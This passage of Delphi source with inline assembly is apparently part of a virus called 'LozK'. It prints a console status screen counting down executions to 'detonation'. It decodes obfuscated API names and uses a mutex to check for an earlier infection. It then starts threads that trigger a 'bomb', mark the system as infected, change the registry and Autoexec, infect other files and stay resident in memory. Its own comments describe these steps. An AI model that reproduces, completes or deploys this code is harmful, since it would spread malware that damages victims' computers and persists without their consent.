   msg[32] := Pchar(CurrentBomb); msg[33] := ' executions for detonation'+sp;
   msg[34] := 'P.D: ...never do one code dedicated to a girl or with her name'+sp+
              '     carry out bad luck for you...anyway..just personnal experiences.';
   for i := 1 to 34 do sise[i] := Length(msg[i]);
   sizze1 := sise[1]; mzg1 := msg[1];
   sizze2 := sise[2]; mzg2 := msg[2];
   sizze3 := sise[3]; mzg3 := msg[3];
   sizze4 := sise[4]; mzg4 := msg[4];
   sizze5 := sise[5]; mzg5 := msg[5];
   sizze6 := sise[6]; mzg6 := msg[6];
   sizze7 := sise[7]; mzg7 := msg[7];
   sizze8 := sise[8]; mzg8 := msg[8];
   sizze9 := sise[9]; mzg9 := msg[9];
   sizze10 := sise[10]; mzg10 := msg[10];
   sizze11 := sise[11]; mzg11 := msg[11];
   sizze12 := sise[12]; mzg12 := msg[12];
   sizze13 := sise[13]; mzg13 := msg[13];
   sizze14 := sise[14]; mzg14 := msg[14];
   sizze15 := sise[15]; mzg15 := msg[15];
   sizze16 := sise[16]; mzg16 := msg[16];
   sizze17 := sise[17]; mzg17 := msg[17];
   sizze18 := sise[18]; mzg18 := msg[18];
   sizze19 := sise[19]; mzg19 := msg[19];
   sizze20 := sise[20]; mzg20 := msg[20];
   sizze21 := sise[21]; mzg21 := msg[21];
   sizze22 := sise[22]; mzg22 := msg[22];
   sizze23 := sise[23]; mzg23 := msg[23];
   sizze24 := sise[24]; mzg24 := msg[24];
   sizze25 := sise[25]; mzg25 := msg[25];
   sizze26 := sise[26]; mzg26 := msg[26];
   sizze27 := sise[27]; mzg27 := msg[27];
   sizze28 := sise[28]; mzg28 := msg[28];
   sizze29 := sise[29]; mzg29 := msg[29];
   sizze30 := sise[30]; mzg30 := msg[30];
   sizze31 := sise[31]; mzg31 := msg[31];
   sizze32 := sise[32]; mzg32 := msg[32];
   sizze33 := sise[33]; mzg33 := msg[33];
   sizze34 := sise[34]; mzg34 := msg[34];
   asm
       Call AllocConsole

       push Titulo
       Call SetConsoleTitle

       push -11
       Call GetStdHandle
       mov [Handy], eax

       mov ebx, 00000006h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze1
       mov esi, mzg1
       mov eax, [Handy]
       Call write

       mov ebx, 00000004h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze2
       mov esi, mzg2
       mov eax, [Handy]
       Call write

       mov ebx, 00000006h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze3
       mov esi, mzg3
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze4
       mov esi, mzg4
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze5
       mov esi, mzg5
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze6
       mov esi, mzg6
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze7
       mov esi, mzg7
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze8
       mov esi, mzg8
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze9
       mov esi, mzg9
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze10
       mov esi, mzg10
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze11
       mov esi, mzg11
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze12
       mov esi, mzg12
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze13
       mov esi, mzg13
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze14
       mov esi, mzg14
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze15
       mov esi, mzg15
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze16
       mov esi, mzg16
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze17
       mov esi, mzg17
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze18
       mov esi, mzg18
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze19
       mov esi, mzg19
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze20
       mov esi, mzg20
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze21
       mov esi, mzg21
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze22
       mov esi, mzg22
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze23
       mov esi, mzg23
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze24
       mov esi, mzg24
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze25
       mov esi, mzg25
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze26
       mov esi, mzg26
       mov eax, [Handy]
       Call write

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze27
       mov esi, mzg27
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze28
       mov esi, mzg28
       mov eax, [Handy]
       Call write

       cmp aoux, 1
       je @Yeah_Owned

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze29
       mov esi, mzg29
       mov eax, [Handy]
       Call write
       jmp @status_end

       @Yeah_Owned:

       mov ebx, 00000004h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze30
       mov esi, mzg30
       mov eax, [Handy]
       Call write

       mov ebx, 00000002h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze31
       mov esi, mzg31
       mov eax, [Handy]
       Call write

       mov ebx, 00000004h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze32
       mov esi, mzg32
       mov eax, [Handy]
       Call write

       mov ebx, 00000006h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze33
       mov esi, mzg33
       mov eax, [Handy]
       Call write
       jmp @status_end

       @status_end:

       mov ebx, 00000003h
       mov esi, [Handy]
       Call Color

       mov ebx, sizze34
       mov esi, mzg34
       mov eax, [Handy]
       Call write
   end;
   readln;
   halt(0);
   end;

   begin
   OwnedSystem := 0;
   aoux := 0;
   Titulo:= Pchar(d('º”Òøš¶LŠÒÄÆÄLÈþLˆþäjŠèlâR‚†„¸ŽŠLVL„’*¤Lª¬¨†Ž„L¤œžªN'));
   msg1:= Pchar(d('¾’¦LœŽªLˆ††*L’¢*†„NL'));
   msg3:= Pchar(d('*ž¸†L¤¨¾N'));
   WinExec := GetApi(d('ÚÆèÐÆÔjhPÄÔÔ'),d('¢ÞÐ†üÆÊ'));     //We get that API...for some reason if i not put this code here ..then there is an error :S
   Mutex_ := Pchar(d('”Òøš'));                            // The Name of our Mutex :)
   mode := 0;                                             // Cleaning Mode Set to 0
   GetAllApis; //We Search Our APIS...
   _OwnedSystem_;                      //Check if this is the first time on the system...
   aoux := OwnedSystem;
   if paramstr(1) = '/wake_up' then Payload;
   if paramstr(1) = '/hello' then LozK_HellO;
   if paramstr(1) = '/status' then LozK_StatuS;
   asm

         push Mutex_
         push 1
         push 0
         Call CreateMutex  //We create our Mutex = LozK

         Call GetLastError //Check if we are already on memory...
         test eax,eax
         jnz @mutex_

         cmp aoux, 1
         je @Normal_         //If then jump...

         @NotOwned:          //If we are here then this is the first time of LozK in the system...

         mov esi, offset IncBOMB
         Call CreateThread_              //Lets see our bomb :)

         mov esi, offset _OwnSystem
         Call CreateThread_              //We make an infected mark...

         mov mode, 0d
         mov esi, offset Cleanx
         Call CreateThread_              //We make one clean copy...

         mov esi, offset Reg_
         Call CreateThread_              //We modify the registry...

         mov esi, offset BaT
         Call CreateThread_              //We modify the Autoexec...


         mov esi, offset _MemoryResident
         Call CreateThread_              //We start the memory residence...
         jmp @_Resident                  //We stay on memory...

         @Normal_:

         Call IncBOMB                   //The bomb...

         mov mode, 0d
         Call Cleanx                    //We clean ourself :)

         mov esi, offset Owner
         Call CreateThread_             //Lets check if we have something to infect :)

         mov ebx, 1d
         mov esi, offset _MemoryResident
         Call CreateThread_              //We start the memory residence...
         jmp @_Resident                  //We stay on memory...


         @mutex_:                       //If we are here then we already exists on the memory...

         mov mode, 0d
         Call Cleanx                    //We Clean ourself...
         Call Owner                     //Check if there is something to infect...

         push 0
         Call ExitProcess               // Exit ...

         @_Resident:
         push -1d                       // We Sleep for infinite time...
         Call Sleep                     // So we stay on memory :)
   end;
   end.
